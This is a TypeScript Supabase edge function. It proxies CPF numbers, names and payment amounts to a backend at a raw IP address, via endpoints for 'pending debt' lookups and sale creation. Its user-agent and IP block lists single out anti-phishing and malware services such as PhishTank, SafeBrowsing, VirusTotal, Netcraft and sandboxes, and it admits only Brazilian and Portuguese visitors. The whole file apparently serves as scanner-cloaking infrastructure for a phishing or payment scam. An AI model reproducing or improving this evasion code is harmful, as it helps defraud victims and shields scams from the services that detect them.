import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version',
};

const API_BASE = 'http://179.0.178.102:5000';
const RECAPTCHA_SECRET = Deno.env.get('RECAPTCHA_SECRET_KEY') || '';
const ALLOWED_COUNTRIES = ['BR', 'PT'];

// ─── Bot detection ───────────────────────────────────────────
const BOT_PATTERNS = [
  /bot/i, /crawl/i, /spider/i, /slurp/i, /curl/i, /wget/i, /python/i,
  /httpx/i, /scrapy/i, /phantomjs/i, /headless/i, /selenium/i,
  /puppeteer/i, /playwright/i, /lighthouse/i, /node-fetch/i, /axios/i,
  /Go-http-client/i, /Java\//i, /okhttp/i, /undici/i, /fetch\//i,
  /urlscan/i, /scan/i, /checker/i, /monitor/i, /probe/i,
  /PhishTank/i, /SafeBrowsing/i, /VirusTotal/i, /Sucuri/i, /Netcraft/i,
  /ScamAdviser/i, /CheckPhish/i, /PhishLabs/i, /Fraudwatch/i,
  /BrandShield/i, /Bolster/i, /Cofense/i, /ZeroFox/i,
  /sandbox/i, /detonation/i, /cuckoo/i, /joe.?sandbox/i,
  /hybrid.?analysis/i, /any\.run/i, /rendertron/i, /prerender/i,
  /browsershot/i, /screenshotmachine/i, /preview/i, /inspector/i,
  /link.?check/i, /site.?check/i, /url.?check/i,
  /safe.?browse/i, /phish.?detect/i, /fraud.?detect/i,
  /threat.?intel/i, /reputation/i, /analysis/i,
  /Apache-HttpClient/i, /libwww/i, /http-client/i,
];

const SCANNER_IP_PREFIXES = [
  '185.180.143.', '167.248.133.', '71.6.',
  '198.235.24.', '66.240.', '93.120.27.',
  '94.102.49.', '64.62.202.', '193.163.125.', '2.57.122.',
];

function isBotRequest(req: Request): boolean {
  const ua = req.headers.get('user-agent') || '';
  if (!ua || ua.length < 20) return true;
  if (BOT_PATTERNS.some(p => p.test(ua))) return true;

  const ip = getClientIp(req);
  if (SCANNER_IP_PREFIXES.some(prefix => ip.startsWith(prefix))) return true;

  const acceptLang = req.headers.get('accept-language') || '';
  if (!acceptLang || acceptLang === '*') return true;
  const secChUa = req.headers.get('sec-ch-ua') || '';
  if (secChUa.includes('HeadlessChrome') || secChUa.includes('Headless')) return true;

  // Chrome without sec-fetch headers = likely not a real browser
  const secFetchDest = req.headers.get('sec-fetch-dest') || '';
  const secFetchMode = req.headers.get('sec-fetch-mode') || '';
  if (!secFetchDest && !secFetchMode && /Chrome\/\d/.test(ua)) return true;

  const hasBrPtLang = /pt|br|en/i.test(acceptLang);
  if (!hasBrPtLang) return true;

  return false;
}

function getClientIp(req: Request): string {
  const xff = req.headers.get('x-forwarded-for');
  if (xff) {
    const first = xff.split(',')[0]?.trim();
    if (first && first !== '127.0.0.1' && first !== '::1') return first;
  }
  return req.headers.get('cf-connecting-ip') || req.headers.get('x-real-ip') || '0.0.0.0';
}

// ─── Geo check (lightweight, cached per request) ─────────────
async function isAllowedGeo(ip: string): Promise<boolean> {
  if (ip === '0.0.0.0' || ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('172.')) return true;
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`, { signal: AbortSignal.timeout(3000) });
    const data = await res.json();
    if (data.status === 'success') return ALLOWED_COUNTRIES.includes(data.countryCode);
  } catch {}
  try {
    const res = await fetch(`https://ipwho.is/${ip}`, { signal: AbortSignal.timeout(3000) });
    const data = await res.json();
    if (data.success) return ALLOWED_COUNTRIES.includes(data.country_code);
  } catch {}
  return false; // fail-closed
}

// ─── Device lock helpers ─────────────────────────────────────
async function checkDeviceLock(supabase: any, cpf: string, deviceId: string, userAgent: string): Promise<{ allowed: boolean; reason?: string }> {
  if (!cpf || !deviceId) return { allowed: false, reason: 'missing_params' };

  const { data: existing } = await supabase
    .from('cpf_device_locks')
    .select('device_id')
    .eq('cpf', cpf)
    .maybeSingle();

  if (existing) {
    if (existing.device_id === deviceId) {
      return { allowed: true };
    }
    console.log(`[device-lock] CPF ${cpf} locked to device ${existing.device_id}, rejecting ${deviceId}`);
    return { allowed: false, reason: 'device_locked' };
  }

  // First access — lock CPF to this device
  await supabase.from('cpf_device_locks').insert({
    cpf,
    device_id: deviceId,
    user_agent: (userAgent || '').substring(0, 500),
  });
  console.log(`[device-lock] CPF ${cpf} locked to device ${deviceId}`);
  return { allowed: true };
}

async function verifyRecaptcha(token: string): Promise<boolean> {
  if (!token || !RECAPTCHA_SECRET) return false;
  try {
    const res = await fetch('https://www.google.com/recaptcha/api/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${RECAPTCHA_SECRET}&response=${token}`,
    });
    const data = await res.json();
    return data.success === true;
  } catch {
    return false;
  }
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // Handle GET for logo proxy
  const url = new URL(req.url);
  if (url.searchParams.get('asset') === 'logo') {
    try {
      const response = await fetch(`${API_BASE}/logo`);
      const blob = await response.blob();
      return new Response(blob, {
        headers: {
          ...corsHeaders,
          'Content-Type': response.headers.get('Content-Type') || 'image/png',
          'Cache-Control': 'public, max-age=86400',
        },
      });
    } catch {
      return new Response('Logo not found', { status: 404, headers: corsHeaders });
    }
  }

  try {
    // ─── Bot check ─────────────────────────────────────────
    if (isBotRequest(req)) {
      console.log(`[api-proxy] Bot blocked: ${req.headers.get('user-agent')?.substring(0, 80)}`);
      return new Response(JSON.stringify({ error: 'Acesso negado' }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    // ─── Geo check ─────────────────────────────────────────
    const ip = getClientIp(req);
    const geoAllowed = await isAllowedGeo(ip);
    if (!geoAllowed) {
      console.log(`[api-proxy] Geo blocked: ${ip}`);
      return new Response(JSON.stringify({ error: 'Acesso restrito à sua região' }), {
        status: 403,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const body = await req.json();
    const { endpoint, cpf, nome, valor, recaptchaToken, deviceId } = body;

    const allowedEndpoints = ['/consulta', '/pendencias', '/criar-venda', '/status-venda', '/pendencias_vag'];
    if (!endpoint || !allowedEndpoints.includes(endpoint)) {
      return new Response(JSON.stringify({ error: 'Invalid endpoint' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      });
    }

    const supabase = createClient(
      Deno.env.get('SUPABASE_URL')!,
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!
    );

    // ─── Device lock enforcement for CPF-related endpoints ─
    const cpfEndpoints = ['/consulta', '/pendencias', '/criar-venda', '/pendencias_vag'];
    if (cpf && cpfEndpoints.includes(endpoint)) {
      if (!deviceId) {
        return new Response(JSON.stringify({ error: 'Dispositivo não identificado' }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }

      const lockResult = await checkDeviceLock(supabase, cpf, deviceId, req.headers.get('user-agent') || '');
      if (!lockResult.allowed) {
        return new Response(JSON.stringify({ 
          error: 'Este CPF já está vinculado a outro dispositivo. Por segurança, a consulta só pode ser realizada no dispositivo original.',
          device_locked: true 
        }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    // Verify reCAPTCHA v2 only for /consulta
    if (endpoint === '/consulta' && recaptchaToken) {
      const passed = await verifyRecaptcha(recaptchaToken);
      if (!passed) {
        console.log('reCAPTCHA v2 verification failed');
        return new Response(JSON.stringify({ error: 'reCAPTCHA verification failed', blocked: true }), {
          status: 403,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
    }

    let response;
    if (endpoint === '/criar-venda') {
      response = await fetch(`${API_BASE}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf, nome, valor }),
      });
    } else if (endpoint === '/status-venda') {
      const { transactionId } = body;
      if (!transactionId) {
        return new Response(JSON.stringify({ error: 'Missing transactionId' }), {
          status: 400,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        });
      }
      response = await fetch(`${API_BASE}/status-venda/${transactionId}`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' },
      });
    } else {
      const formData = new URLSearchParams();
      formData.append('cpf', cpf);
      response = await fetch(`${API_BASE}${endpoint}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: formData.toString(),
      });
    }

    const data = await response.json();

    return new Response(JSON.stringify(data), {
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error) {
    console.error('Proxy error:', error);
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
